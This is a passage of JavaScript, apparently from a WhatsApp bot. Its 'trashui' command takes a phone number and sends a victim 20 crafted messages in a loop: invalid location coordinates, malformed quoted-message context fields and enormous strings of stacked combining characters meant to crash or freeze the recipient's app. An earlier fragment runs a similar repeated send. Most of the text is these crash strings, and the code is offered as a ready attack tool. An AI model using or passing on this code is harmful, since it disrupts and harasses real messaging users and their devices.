̡̧̨̨̧̡̨̧̡̧̢̧̨̢̡̨̡̢̢̨̡̧̢̨̡̢̧̧̛̛̛͕͎̺͍͎̫̭̞̺͔̭̹͈̲͈̤̰̫̲̺͖̱̣̮̙̹̘̟͇͇̖̗̯̣̙͔̖̖̳̙̠͖̱̣̘̺͙̙̯̠̹͚̩̞̜̺̠̮̬̦̯̺̲͚͎͓͇͈̩̝͇͔̰̝͕̘̬̭̖͉̝̼̝̣͓̼̖̭̫͈̦̟̙̜̮̪̪̫͇͚̜͎̮̣͎͚̖̫͔̳͇̗̼̦͈̭̮̙̭̖͈̘̱͖̦̲̲̳̱͈͍̹̦̣̼͕͔͈̝̻̘̞̲̥̥̞̖̗̩͕̼̬̞͓̦̫̩̳̫͚̮͎̮̗̘͇̗̹̳͚͍̱͓̥͉̙̬̙̭̪̪̖̩͔̳̟̤̻͙̦̬͈̣͎͍̖̻̖̪̻̩̖͙͚͇̤̟͚͎̮̖͈̻͉̣̟͕̥̱͕̩͙̲͕̱̼̹͓̥̠̝͇̖̪̹̜̮̝̣̞̖̦̟͉̰̖̪̣̺͙̙̮̪͚͔̱̙̼͒͆̋̃͗̿̓̆̔́́͑͊̑̾̄͐͒͂̅̂́̆͒̽̋́̈́̏̿͑̿̈́̿̀͑̎̏̌̂̈̾̋̒͒̐̊̾͛͆̊̃̀͌̓̈́̌͗̽̾̔͑̔͛͐͒͛͆̇̆͊̓̋̇̈́̃̔̒̈̑͗̍̆̆̑̌̓͐͐̚̕͘̕͘̕͘̚̕̚̚̚̚͜͜͜͜͜͜͜͝͝͝͠͝ͅͅͅͅͅͅI̶̧̨̡̨̨̢̧̢̢̡̢̢̨̧̛̛̛͔̝̤͙̬̼͕͈̯̦̰̘̯̝̮͓̭͎̞̳̙͙̭̯͎̲̞̼͚̼̩̩̬͚̝̥̰̠͓͈͍̲͉̦̬͍͚͔̮̱̪͉̲̹̠͔̖͍̥̫̠̳̞̺̞͇̺͖̞̭͈̪͎̟͉̪͔̣̣͚͕͎̼̳̘͎̜̗̺̦͓̱̻͈̞̠͔̯̬͚̩̯̮͎͚̼̥̝̩̯̮̙̯̰̮̰̦̣͇͎̺͎̤̖̟̳̥̖̗̥̜͓͉̫̺͎͙̘̙̰̙̗̣̥͈͚̣̝̩͙̠͙̬̟̘͇̣͖̽̐̓͐́̈̉͌̐͆̓̂̀̎̐͗̏̆̀̌͆͋̀̍͐̏̂͂̽̎̋̈́̌̅͆̋͐̈́̊͊̀͒͌̓̌̀̊̂̀̔̇̒̑͛͌͂̋̒͋̀̄̌̈́̏̀̔̑̈́̔̍̉̅̈́̀̐͒̈̓̌̓͗̀͒̂̈́̅̀̾͑̃̈́̂̉̽̒̑̒̇̉͂͊̌̏͗̀̅̃͌͌̂́̈́̉͌͒̈́͌̈͐̆̽̆̐̏̉̔̾̀̆̈́̒̈́́̎͐̾́͗͒̂͑̒̉̀̋̿̀̊́̆̈́̿͂̈́̍͌̋̎̌͆̑̈́̓̒́͑̎̌̾̏̊̍͋̍͆̾͛̾̽̈̓͐̀̎̽̓̑͗̅͒̋̅̈̌͒́͐͐̈́̾̈́̀̆́̌̎̋̓̀̿́͊̎͆͊̆̐́̃̂̐̂̐̀̍̈́͊̊́̊̋̔͗͒͗́̋͐̈̆͊̋͛̇͆̒̄̈́̓̚̕̚̕̕̕͘͘̕̚͘̕͘̕̕͘̕̚̚͜͜͜͠͝͝͝͝͠͠͝͠͠͝͝͝͝͝͝͠͝͝ͅͅͅͅͅᆞ̸̢̨̢̧̨̨̡̡̧̧̡̡̧̢̛̛̛̛̛̛̛̛͇͚̮̮̺̼̰̗͍͓̣̹̥̥̣̠͔̪̫͎̮̺͉̖͇̘͉̲̬̙͙̩̗̝͈̗͚̱̟̘̪͓̬͍̺̗̞͙̙̬̹̭͇̱̮͉̞̜̲̟̲̟͉͚͚̱̰̙̦̗̝̗̮̬͓̰̞̬̼̞̟̲̗̬͚̦̮͕̹̜̥͙͉̟̠͓̫͔̞̺̞͙̣͔͓̹͖̫̭̫̦̝͖̙͚̭̘͈͈̪̤̤̙̰͚̤̺̱̖̖̥̘̙̮̠̺̩̜̞̜͔̝̪͚̻̥͈͉̲͇͈̪̩̫̱̩̱͚͎̘̣̮̖̬̘̥͓͓̥͎̣̗̖̺̣͖̯͕̳̣͙̌̂̌̐̐͂̌̊̀̒͂̉̐̀̂̒̑͗͛̐̀̏͂͐̃̐͆͒̃̊͒̔̀̂̓͛̑́̈́̀́͋͋̄͑́͑̔̓͐͑̿̎̎̓̿͌͑́͋̈́̿͛͑̌̈̇̊̆̄̂͑́͌̑̊̂͗̂́̾̍̾̌̀̑́͋́̆̓̀̀̓͌̎̇͋̓̎́̅̎̈́̉̌̂̾̌̔͊͑̓̈́̋͗̆͂͐́͑́̀͂̈́́͗̾̈́́̆̇̿̿͗̅̎͑̍̎̅̍͒̓̓̎̓̔͋͘̚͘̚͘̕̕̚̚̚̕̚̚̚̕͘͜͜͜͜͜͜͝͝͠͝͝͠͠͝͠͝͝ͅͅͅͅͅᆞ̷̢̛̛̛̳͉͍̘̞̫͔͚͇̪̬̹̟̭͍͎͓̦͑̒̋͒̈̏͗̔͒͒̑̽́͐͂͆̃̂̂͐͛͋̾̋́̆̑̀͋̂̅̽̒̃̾͑͐̎͑͛̉̆̒̀̌̍̔͛̂̀̍̒̅̈̂͊͐̽̏͋̉̃̆̆͒̓̿̿͋̀́̉̔̐̀̔̒̿͌̐̓̀̾̒̐̌̈́͊̀͗̄͗͑̑̌́̔̀̕̕̕̚̚͘͝͝͝͝͝͝͠͝Ơ̶̢̡̧̧̛̛̛̛̬̟̘͓̗̝̺̺̫̺͇̫͇̫̠̤̗͍̫̜̩͇̯̻͕̖̮̙̱̤͚͎̟͍̦̙͈̟̦̱̖̠̦̮̗͖̭͚̪͕͎͉̥̥̞͖͓̳̩̺͇͎͋̈́̅̈̅̔͂͋̇͐̔̈́͗̔̈́̃̃̌̌́͑̌̉̀̆̽̓̊̈́̀̈́̑̾̌̍̑̂͋͑̄͂͑̈́́̋́̑̈́̉̄͑̊̓͊̈́͆̒̅͒̇͊́͗̂͐̈́̾̀̂́̄̿̋͒̓͌̅̎̑̎͒̈͑͛̐̂͑̈́̃̓͗̆̇̍̀̈́͊̓͂͛̃̈̅͛̍̍̋̈́̌͗͌̍͆͆͆͐̐̈͒̈́͑̾͋̊́̊͂̀̏̀͌̍͒̔͛̾̒̉͂̊̏̅̾̑̓̂̀͑̂̈́͌̇̊͊̅̂̿̌̾̆͆́̀̐̂͗̋̆̀̀̌̓̑̈́̿̆̀̒͌̓̉́̇̀͊̾̓͛͗͋̎̈͑͌͑͘͘͘͘̚̚̕͘͘̕͘̕̚͝͠͠͠͝͝͝͝͝͠͠͠͠ͅᆞ̴̧̡̢̧̨̡̧̧̨̧̧̢̢̡̨̡̡̡̡̡̛̛̛̛̛̛̛̘̺̹̯͙̗̩̖̻̼̺͎̮̬̟̭̰͔̞̻̜͙̥̞̗̖͔͖̺̼͉̯͈͙͕̘̲̙̼͈̫̞̜̰͔̖̮̦̙̻̬̩͇̖̮͕̭̪̤̘͈̖̩͍̩̰̪̯̠͕̻̖̩͈͚̣̜̭͙͖͉̪̙̠̼̝̺̪̯̣̭̞͎̤͕͔̯̞̤͖̘̹͈̤̖̺̖͎̼͙͚͚̲͇̺̙͎̰̳̞͓̲̜̲͈̩̟͎̞̙͚̪̳̭̳̟̥̱̤̲̤̼͙͇̼̯͚͖̜̯̟͖̮̬͔͔̬͙͎͖̤͍̤̥̫̗̥͈̜̼̝͉̮̹̰̦̺̠̣̘̲̪̗̯̪̻͇͍̱̙̮̯̹̜̥͕̳͓͓̗̖̹̮̫̫͍̲͔̺͔̰̪͉̮̦͔̜͖̤̯͔̠̺̖̥͚̤̥̣̗̲͇̻̤̹̞̫̙̼̑͊̿̆͒͗̀̆̀̾͐̽̏̈̒̈̉͐̀́̈̌͗̈́͋̏̀́̀͌͒̐̾͐̀̃̿̔̐͑̃̓́̇̒̃̓͑̑̆̾̆̓́͌̒̔͗̓͒̽̊̽̑͋͌̐̓͑̀̈̈́̈́̃͋͒̅̍̏͊̅͂̽̔͑̈́̋̎͌͌̈́̈̊͋̑̎̅̃͋̿͛̌̂̊̓̽͒̑́͆̉͗̀̎̅́̎̒͋̒̊͊̋̾͂̆̈́̓̀̀̈́̓́̆́͆́̋́̍̉̆͛̔̈́͆͐̍̒́̒͋̇̃̚͘̕̕͘̚̕̕̕̕͘͘͜͜͝͝͠͝͠͠͝͝͠͝͝͝͝͠͠ͅͅͅͅͅͅᆞ̶̨̨̨̡̨̨̧̢̡̢̧̨̧̨̢̛̛̛͈͔̱̖̱͙̣͚̮̦̗̜͚͈̹̩͕̖̺͚̦̩͈̯͔̗͚͈͎̼̗͍̝̝͈̘͉͉̥͇͚͔͓͎̣̼͖̝̜̻̺̥̟̣̗̮̭̻̮̱̰͇̖̻̺̙̳͇͙̯̳͕̮̬̙̣͓̲̳̖̬̟͔̜̱͓̪̤̱̬̝̥̺̰̠͚̪͔̘̙͚͓̜̜͈͇̘̮͕̫̪͓͉͕̰͈̹͎͚̱̗̝̼͈̞̰̮̭̤̹̗̙̻͉̮͍͍̫̳͎̣̤̻͈͎͈͈̗̣̪͕͕̠̮̙͍͔͔̼̥̜̻̗͊͋̏̀̆͗̄͋̽̀̏̅̓̒̽̑̈́̽̏̎́̋̃̆͊̆̐̍̓̆͊̆̉̑̐͛̄͋͑̽́̍̇͂̆͐̆̎̒̓̍̌̀̎̋̐̌̋̂̑̆̀̏̍̊͌͒̈́̃̇̉̾͛̇̃̃͒̑̀̔̌̂̄͌̽͂̓͋̋̄̔̈̈́̊͛͒̈́͌̒̄̈́̔̌͗̓͋̒̉̔̚͘̕͘͘͘̚̕͜͜͜͜͜͜͠͠͝͠͝͝ͅͅͅͅͅͅN̷̢̢̧̨̢̛̛̛̛̛̛̯̱͙͉͚͎̮̲̣͖̻̜̣̯͚̻͇͓͔̥̭̥͙̝̹̫͔̪͈͕̱̼̹̺̩͉͎͕̝͓͈̘̘̳̫̼̲̪̫̟͖̺͖̩̟͉̘̮͍̥̪̤̲͙̭̼̖̙̠͓̥̳̰̣̼̻̺̝̲̻̮̱͉̫͔̣̪̬̩̔̃́̈́̀̈́̉͆̀́̏̒͛͌͋̓̂̌͛́́͑̈̊͗̒̓̄̾̒͒̂̉͐͐̾͛̓̅͂͋̆̄́̉̉̊͌̅͗̾͐̐͒̆̆̇͗̂̃̊̐͌̈͂̐͆̆̎̋͋̄͒͆͛̽̀̓̽̈́̍̍̑̇̈́̿̍́̅̾̀̾̀̃̽̐͊͛͌̈̇̾̂̓̉̈́̽͑̓̂̅́͆͗́͛̌͌́̂͊͌̓̏̊̀͋̔̐̂͑̄͆̈́͌̿̀̓̌̋̋̀̀̃́͒̇͂̄͒̀͋͌̇̒̏̓̂̅̇̀͊͋̈͌̐͊͛͒̇̐̐̔͗͋̓͋̾̐̐͑̀̀̄̊́̏̓̑̾̀͂͌̑̀̍̍̐̈́̄͛̇̉̈̐̑̄̐͌̎̈́̚͘̕̕̕̚͘̕̕̚̚̕̕̕͘̕͘͜͜͠͝͝͠͠͝͝͝͝͝͠͝͠͠͝ͅͅͅᆞ̸̡̧̢̧̧̢̨̡̧̢̡̢̧̨̢̡̡̛̛̛͎̺̮̤̜̫̼͚̣̠̙̬͔̻̼͖̬͇̺̮͖͈̬͔͍̜͖̺̻̞͖̪̞͚͉̱̣̹͓͇͎̻̞̫͍̹͓͈͓͕͉̣̩͖̺̩̪̖̺̤̭̲̰̰̥̤̰̗͚̹̱̳͕͔̱͇̦̟̬̱̙͓̭͉̟͈̻̻̟̯̲̦͈͓̱̰̮̘͍̳͙̲̦̻̖̯̟̱̟̮̯̟̫̜̗͍̲̺̪͚͈̮̳̳̣̻͚̼͙͇̙̹͓̣͎͎̥̬͔̯͖͕͎͉͎̪̝͍̙̳̤͍̪͎̥̲̻̯͍͙͉̣̼̝̤̟͇̰̦̦͎̹̼͚̩͇̠͍̭͖̗̬̯̥̰̣̮̤͕͔̞͚̱̲̲̫̘̫̗̹͚̘̲̯̼̩̬̥̩̝͙̞̙̤̳̫̭͕̼̤̫̣̦͚̺̼̝̩͚̭̳̫͖̪͈̓̀̑̑̽͊͆̅̄͗̇̔̌̑̽͗̄̾̈̋̍̅̓͐͐̂̉͂͌̀͆́̀̐̂͑̐̀̎̀̂̓̂̽͂̒̈́͑͌̋̓̔͐̎̓͗͆̊̉͆̒̈̇̇̽̀̃̃̾̿̏̅̿́̀̔͋̈͗̄̈̒͒̈́̃̄̓͋̐̋͐̐͗̾̄͗̅́̉̀̄̾̔̔͆̂̒̌̓͂͂̋̃̌̂͒̒͋̃͐̅̊̽̓̒̽̑͆́̌̏̕̕̚̚̚̚̚̕̚̚̕̚͜͠͝͝͠͝͝͠ͅͅͅͅͅͅͅ☠̴̨̡̡̛̛̙̜̙̖̩̩̫̮̹͈̱͍̲̠͉͚͓̪̯̹̻͚̣͍͕̖̻͎̭̹̞̻̙̼͇̘͓̰̯͇̳̪͇͓͕̱͎͈͎̞͉̗̯̪̲̘͙̞̯̜͈͉̼̼̺̲̭͙͙̃̇͗̈̅̓̍̀̈̾̌̆͊͋͛͋͌̓̋͋̾́̈͊̓̀̋͐̓͋̊͒̆̏̓̈́̓̇̆̓̄̐͗͛͐͛͑͋͊͌̈̎̿̈̈̅̿͒̌̈͂̽͒̑̂̑̀͂̌̀̆̍͆͐͂̋̃̈́̅̈̍̈͊̽̋̓́̓̌̍̒͛̅̎̎̊̽̎̎͐̈́̈́͗͛̈́̏̋͗̑͒̌̐̽̋̀̅̑̒̔̄̈̈́̈́͊͛̅͆̆͆̀̈́̈́̑͋͆͐̏̋̈́̇̒̄̆̀̿̂̀̇̑̄̃̊͛̎͂͛̈́̾̉͋̈͂̎̉͆͘̚̚̚̚̚͘̕̕̚͘̚̕̚͘̕̚̚̚̚͘̕͘̕̕͜͜͠͠͠͠͝͝͝͝͠ͅͅͅͅͅ️̶̢̢̡̡̧̤͖͔̼̗͎̗͔̘̪͙̺͇̥͚̤͈̪͇̥̥͙̳̫͈͓̙̗̦͍͍̭̜̮͇͎̖̥͈̬̣̲͉̦̱̬̦͔̰͙̠̣̹̥͙͐̉̅̔͜͜ͅͅͅͅ.com`,
      commet: xiphone,      
      jpegThumbnail: null
    }
  }, { quoted: xbug })
  await sleep(6000)
}
await xreply(`> Done! Sending BUG Use ${prefix + command}`)
}
break
//=================================================//
case "trashui":{
if (!text) return xreply(`${prefix + command} 62857xxxxxxx`)
await bugloading()
await xreply(`> Sending BUG Use ${prefix + command}`)
let victim = text.split("|")[0]+"@s.whatsapp.net"
let amount = 20
for (let i = 0; i < amount; i++){
  await xartva.relayMessage(victim, {
    extendedTextMessage: {
      text: xiphone,
      contextInfo: {
        stanzaId: victim,
        participants: victim,
        quotedMessage: {
          conversation: xtext        
        },
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        }
      },
      inviteLinkGroupTypeV2: true
    }
  }, { messageId: null })
  await xartva.sendMessage(victim, {
    location: {
      degreesLatitude: 999.999,
      degreesLongitude: -99.888,
      name: xtext,      
      address: '̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̷̡̢̢̢̢̢̡̢̢̨̧̛̛̱̠͍̟̺͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕̕̕̚͘̕̕͘̚̚͘͜͜͜͝͠͠͝͝͝͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̛̛̛̛̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌̕͘͘̚̕͘̕̚͘͝͠͝͝͠͠͝͠͝